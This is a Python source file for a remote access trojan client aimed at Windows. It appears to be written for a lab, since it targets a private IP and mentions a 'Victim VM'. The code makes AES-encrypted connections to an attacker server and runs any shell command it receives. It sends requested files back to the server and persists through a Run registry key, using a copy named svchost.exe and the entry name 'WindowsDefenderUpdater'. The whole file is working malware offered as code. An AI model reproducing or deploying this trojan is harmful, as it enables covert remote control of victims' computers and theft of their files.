import socket
import subprocess
import os
import sys
import time
import random
import shutil
import winreg
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import base64
import os as crypto_os

ATTACKER_IP = "10.0.3.20"
ATTACKER_PORT = 9999
BUFFER_SIZE = 4096
RECONNECT_DELAY = 5
SIMULATE_DELAY = True
SIMULATE_STARTUP_DELAY = random.uniform(1, 5)
PERSISTENCE_KEY_NAME = "WindowsDefenderUpdater"
COPY_TO_TEMP = True
TEMP_FILENAME = "svchost.exe"

SHARED_PASSWORD = b"MyS3cr3tP@ssw0rd!2024"
SALT = b"ratsalt12345678"

backend = default_backend()

def debug_print(message):
    print(f"[RAT] {message}")

def derive_key(password: bytes, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=backend
    )
    return kdf.derive(password)

try:
    AES_KEY = derive_key(SHARED_PASSWORD, SALT)
    debug_print("Encryption key derived from password.")
except Exception as e:
    debug_print(f"Error deriving encryption key: {e}. Encryption disabled.")
    AES_KEY = None

def encrypt_data(data: bytes) -> bytes:
    if not AES_KEY:
        return data

    iv = crypto_os.urandom(16)
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()
    pad_len = 16 - (len(data) % 16)
    padded_data = data + bytes([pad_len] * pad_len)
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    return base64.b64encode(iv + ciphertext)

def decrypt_data(data: bytes) -> bytes:
    if not AES_KEY:
        return data

    try:
        if isinstance(data, str):
            data = data.encode('utf-8')

        encrypted_data = base64.b64decode(data)
        if len(encrypted_data) < 16:
            raise ValueError("Data too short for IV")

        iv = encrypted_data[:16]
        ciphertext = encrypted_data[16:]
        cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(iv), backend=backend)
        decryptor = cipher.decryptor()
        padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
        pad_len = padded_plaintext[-1]
        if pad_len > 16:
            pad_len = 1
        return padded_plaintext[:-pad_len]
    except Exception as e:
        debug_print(f"Decryption error: {e}")
        return data

def add_to_registry():
    try:
        current_script_path = os.path.abspath(sys.argv[0])
        final_path = current_script_path
        if COPY_TO_TEMP:
            temp_dir = os.environ.get('TEMP')
            if not temp_dir:
                debug_print("Could not find TEMP directory for copying.")
                final_path = current_script_path
            else:
                destination_path = os.path.join(temp_dir, TEMP_FILENAME)
                try:
                    shutil.copy2(current_script_path, destination_path)
                    debug_print(f"Copied client to: {destination_path}")
                    final_path = destination_path
                except Exception as e:
                    debug_print(f"Failed to copy file to TEMP: {e}. Using original path.")
                    final_path = current_script_path

        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, PERSISTENCE_KEY_NAME, 0, winreg.REG_SZ, final_path)
        debug_print(f"Added persistence: {PERSISTENCE_KEY_NAME} -> {final_path}")
        return True
    except PermissionError:
        debug_print("Permission denied adding to registry (might need higher privileges).")
    except FileNotFoundError:
        debug_print("Registry key not found.")
    except Exception as e:
        debug_print(f"Failed to add persistence via registry: {e}")
    return False

def connect_to_server():
    sock = None
    while sock is None:
        try:
            debug_print(f"Attempting to connect to {ATTACKER_IP}:{ATTACKER_PORT}...")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((ATTACKER_IP, ATTACKER_PORT))
            sock.settimeout(None)
            debug_print("Connected to RAT server!")
            return sock
        except (socket.timeout, ConnectionRefusedError, socket.error) as e:
            debug_print(f"Connection failed ({e}). Retrying in {RECONNECT_DELAY}s...")
            sock = None
            time.sleep(RECONNECT_DELAY)
        except Exception as e:
            debug_print(f"Unexpected connection error: {e}. Retrying...")
            sock = None
            time.sleep(RECONNECT_DELAY)
    return sock

def execute_command(command):
    debug_print(f"Executing command: {command}")
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        output = result.stdout + result.stderr
        if not output:
            output = "[Command executed - No output]"
        return output
    except subprocess.TimeoutExpired:
        return "[Error: Command timed out after 30 seconds]"
    except Exception as e:
        return f"[Error executing command: {e}]"

def recv_exact(sock, n):
    data = b""
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            raise ConnectionError("Connection closed unexpectedly")
        data += packet
    return data

def send_file(sock, filepath):
    filesize = os.path.getsize(filepath)
    filename = os.path.basename(filepath)
    header = f"download_result {filename} {filesize}"
    sock.sendall(encrypt_data(header.encode('utf-8')))

    with open(filepath, "rb") as f:
        while True:
            chunk = f.read(1024)
            if not chunk:
                break
            enc_chunk = encrypt_data(chunk)
            sock.sendall(len(enc_chunk).to_bytes(4, 'big'))
            sock.sendall(enc_chunk)
    debug_print(f"File {filename} sent successfully.")

def main():
    debug_print("RAT Client started.")
    if SIMULATE_DELAY and SIMULATE_STARTUP_DELAY > 0:
        debug_print(f"Simulating startup delay ({SIMULATE_STARTUP_DELAY:.1f}s)...")
        time.sleep(SIMULATE_STARTUP_DELAY)

    persistence_result = add_to_registry()
    if persistence_result:
        debug_print("Persistence setup completed.")
    else:
        debug_print("Persistence setup failed or skipped.")

    sock = None
    try:
        while True:
            if sock is None:
                sock = connect_to_server()

            try:
                data = sock.recv(BUFFER_SIZE)
                if not data:
                    debug_print("Server closed the connection.")
                    sock.close()
                    sock = None
                    time.sleep(RECONNECT_DELAY)
                    continue

                decrypted_command = decrypt_data(data).decode('utf-8', errors='ignore').strip()
                debug_print(f"Received command: {decrypted_command}")

                if decrypted_command.startswith("upload "):
                    parts = decrypted_command.split(" ", 2)
                    if len(parts) == 3:
                        filepath = parts[1]
                        try:
                            send_file(sock, filepath)
                        except Exception as e:
                            debug_print(f"Error sending file: {e}")
                    continue

                output = execute_command(decrypted_command)
                response = f"[Output from Victim VM]\n{output}\n[End of Output]\n"
                sock.sendall(encrypt_data(response.encode('utf-8')))
                debug_print("Output sent back to server.")

            except socket.timeout:
                debug_print("Socket timeout (unexpected).")
                sock.close()
                sock = None
            except (ConnectionResetError, BrokenPipeError):
                debug_print("Connection to server lost.")
                sock.close()
                sock = None
                time.sleep(RECONNECT_DELAY)
            except Exception as e:
                debug_print(f"Error in main loop: {e}")
                try:
                    sock.close()
                except:
                    pass
                sock = None
                time.sleep(RECONNECT_DELAY)

    except KeyboardInterrupt:
        debug_print("Client stopped by user (Ctrl+C).")
    except Exception as e:
        debug_print(f"Unexpected error in main: {e}")
    finally:
        if sock:
            try:
                sock.close()
                debug_print("Socket closed.")
            except:
                pass
        debug_print("RAT Client exiting.")

if __name__ == "__main__":
    if "--autorun" not in sys.argv:
        sys.exit(0)
    main()
